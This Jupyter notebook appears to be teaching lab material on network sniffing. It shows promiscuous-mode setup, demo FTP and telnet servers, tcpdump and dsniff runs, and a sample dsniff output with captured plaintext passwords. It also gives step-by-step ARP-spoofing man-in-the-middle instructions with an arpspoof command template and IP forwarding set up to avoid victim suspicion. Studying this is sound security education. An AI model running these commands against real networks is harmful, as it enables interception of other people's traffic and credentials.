{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Network Sniffing\n",
    "- sniffing packets in unswitched network is fairly easy as packets are usually broadcasted to all the hosts in the network\n",
    "- hub is a network device that broadcasts all the packets e.g. and simply running the interface card in promiscuous mode would collect all the data that was broadcasted\n",
    "- sniffing packets in switched network is a bit challange\n",
    "- if systems are behind router or network switch they're using swtiched network\n",
    "    - packets are redirected to destination based on their MAC address"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500\r\n",
      "        inet 192.168.231.152  netmask 255.255.255.0  broadcast 192.168.231.255\r\n",
      "        inet6 fe80::20c:29ff:fed7:4d09  prefixlen 64  scopeid 0x20<link>\r\n",
      "        ether 00:0c:29:d7:4d:09  txqueuelen 1000  (Ethernet)\r\n",
      "        RX packets 15469  bytes 19018045 (18.1 MiB)\r\n",
      "        RX errors 0  dropped 0  overruns 0  frame 0\r\n",
      "        TX packets 5759  bytes 379000 (370.1 KiB)\r\n",
      "        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0\r\n",
      "        device interrupt 19  base 0x2000  \r\n",
      "\r\n",
      "lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536\r\n",
      "        inet 127.0.0.1  netmask 255.0.0.0\r\n",
      "        inet6 ::1  prefixlen 128  scopeid 0x10<host>\r\n",
      "        loop  txqueuelen 1000  (Local Loopback)\r\n",
      "        RX packets 3891  bytes 2469487 (2.3 MiB)\r\n",
      "        RX errors 0  dropped 0  overruns 0  frame 0\r\n",
      "        TX packets 3891  bytes 2469487 (2.3 MiB)\r\n",
      "        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0\r\n",
      "\r\n"
     ]
    }
   ],
   "source": [
    "! ifconfig"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "on: Unknown host\r\n",
      "ifconfig: `--help' gives usage information.\r\n"
     ]
    }
   ],
   "source": [
    "#ifconfig <interfaceCard> promisc on\n",
    "!ifconfig eth0 promisc on"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "eth0: flags=4419<UP,BROADCAST,RUNNING,PROMISC,MULTICAST>  mtu 1500\r\n",
      "        inet 192.168.231.152  netmask 255.255.255.0  broadcast 192.168.231.255\r\n",
      "        inet6 fe80::20c:29ff:fed7:4d09  prefixlen 64  scopeid 0x20<link>\r\n",
      "        ether 00:0c:29:d7:4d:09  txqueuelen 1000  (Ethernet)\r\n",
      "        RX packets 15474  bytes 19018422 (18.1 MiB)\r\n",
      "        RX errors 0  dropped 0  overruns 0  frame 0\r\n",
      "        TX packets 5763  bytes 379252 (370.3 KiB)\r\n",
      "        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0\r\n",
      "        device interrupt 19  base 0x2000  \r\n",
      "\r\n"
     ]
    }
   ],
   "source": [
    "#ifconfig <interfaceCard>\n",
    "! ifconfig eth0"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Reading package lists... Done\n",
      "Building dependency tree       \n",
      "Reading state information... Done\n",
      "vsftpd is already the newest version (3.0.3-12).\n",
      "0 upgraded, 0 newly installed, 0 to remove and 1611 not upgraded.\n"
     ]
    }
   ],
   "source": [
    "# install ftpd server for demo - remember FTP is not encrypted; typically use OpenSSH\n",
    "# http://itsfoss.com/set-ftp-server-linux\n",
    "! sudo -S apt install vsftpd -y"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# configure FTP Server\n",
    "! man vsftpd.conf"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### configure and restart FTP Server\n",
    "- open /etc/vsftpd.conf to change settings\n",
    "- allow users in /etc/passwd to login\n",
    "    - local_enable=YES\n",
    "- allow uploading to the FTP server\n",
    "    - write_enable=YES\n",
    "- bypass writable check; add the following directive\n",
    "    - allow_writable_chroot=YES\n",
    "- files are served by default from /srv/ftp\n",
    "- restart FTP server\n",
    "- add a new user say ftp-user\n",
    "\n",
    "```\n",
    "$ sudo adduser ftp-user\n",
    "```\n",
    "\n",
    "- make /home/ftp-user not writable\n",
    "\n",
    "```\n",
    "$ sudo chmod a-w /home/ftp-user\n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [],
   "source": [
    "! echo user | sudo -S systemctl restart vsftpd"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## install ftp client if missing"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Reading package lists... Done\n",
      "Building dependency tree       \n",
      "Reading state information... Done\n",
      "ftp is already the newest version (0.17-34.1+b1).\n",
      "0 upgraded, 0 newly installed, 0 to remove and 1611 not upgraded.\n"
     ]
    }
   ],
   "source": [
    "! echo user | sudo -S apt install ftp -y"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# run update if ftp install fails\n",
    "! echo user | sudo -S apt update"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "tcpdump: verbose output suppressed, use -v or -vv for full protocol decode\n",
      "listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes\n",
      "^C\n",
      "\n",
      "0 packets captured\n",
      "0 packets received by filter\n",
      "0 packets dropped by kernel\n"
     ]
    }
   ],
   "source": [
    "# run tcpdump from a terminal\n",
    "# tcpdump -l -X 'ip host <ip>'\n",
    "! echo user | sudo tcpdump -l -X 'ip host 192.168.1.148'"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# run dsniff from a terminal\n",
    "! dsniff -n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Install and run telnet server\n",
    "- not secure; use ssh\n",
    "- https://www.cyberciti.biz/faq/howto-install-enable-telnet-on-debian-linux/\n",
    "- not working!!"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! echo user | sudo -S apt install telnet telnetd -y"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! echo user | sudo -S /etc/init.d/xinetd restart  "
   ]
  },
  {
   "cell_type": "raw",
   "metadata": {},
   "source": [
    "dsniff: listening on eth0\n",
    "-----------------\n",
    "12/10/02 21:43:21 tcp 192.168.0.193.32782 -> 192.168.0.118.21 (ftp)\n",
    "USER leech\n",
    "PASS l8@nite\n",
    "-----------------\n",
    "12/10/02 21:47:49 tcp 192.168.0.193.32785 -> 192.168.0.120.23 (telnet)\n",
    "USER root\n",
    "PASS 5eCr3t"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Active sniffing\n",
    "- in a switched network environment, packets are only sent to the port they are destined for (using MAC addresses)\n",
    "- promiscuous devices aren't able to sniff any additional packets that aren't destined for them\n",
    "- a switch usually has multiple ethernet ports with its own MAC addresses"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## arp spoofing\n",
    "\n",
    "- arp spoofing allows the attacker's to redirect the victims packets to her system\n",
    "- send a bunch of bogus ARP reply with attackers MAC but victim's IP; saying hey this is my IP and my MAC is this...\n",
    "- victim then refreshes its ARP cache table (unless its explicitly marked as permanent) or adds new entry\n",
    "- systems will accept ARP reply even if they don't send out ARP request\n",
    "- also called ARP cache poisoning\n",
    "- typically attackers would want to spoof gateway/router/switch that routes all the traffic from a local network out to the Internet\n",
    "\n",
    "<img src=\"resources/arp-spoofing.png\" />"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## steps\n",
    "    - we'll do a simple MitM between two victims for ethical reasons given we have permission from the victims\n",
    "\n",
    "1. add the MAC addresses of the victims on the attackers machine"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# ping a victim ip\n",
    "! ping -c 1 -w 1 <victim1 IP>"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# ping another vitim ip\n",
    "! ping -c 1 -w 1 <victim2 IP>"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# test the arp cache\n",
    "! arp -n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "2. enable ip forwarding capability in the kernel so the victims do get their packets and are not suspicious of any spoofing activities"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# check ip_forward settings - 0 means disabled\n",
    "! echo user | sudo -S cat /proc/sys/net/ipv4/ip_forward"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! echo user | sudo -S sysctl net.ipv4.ip_forward"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# enable if necessary on the fly\n",
    "! echo user | sudo -S sysctl -w net.ipv4.ip_forward=1"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### enable ip forwarding permanently\n",
    "- open /etc/sysctl.conf file in an editor add the following line\n",
    "```\n",
    "net.ipv4.ip_forward = 1\n",
    "```\n",
    "- run the following command to enable the changes made\n",
    "\n",
    "```\n",
    "$ sysctl -p /etc/sysctl.conf\n",
    "```\n",
    "\n",
    "- or on Ubuntu run the following command\n",
    "\n",
    "```\n",
    "$ /etc/init.d/procps.sh restart\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "3. run arpspoof program to sniff packets on a switched LAN"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! man arpspoof"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### must run as root for arpspoof to work\n",
    "```\n",
    "$ sudo arpspoof -i <interface> -t <targetIP or victim1IP> -r <hostIP or victim2IP>\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Wireshark\n",
    "- https://www.wireshark.org/docs/wsug_html_chunked/ChapterIntroduction.html\n",
    "- https://www.wireshark.org/docs/wsug_html_chunked/ChWorkBuildDisplayFilterSection.html\n",
    "- some filters - see manage saved bookmarks for exampes\n",
    "- ip.src ==192.168.1. and ip.dst == 192.168.1.122"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.3"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
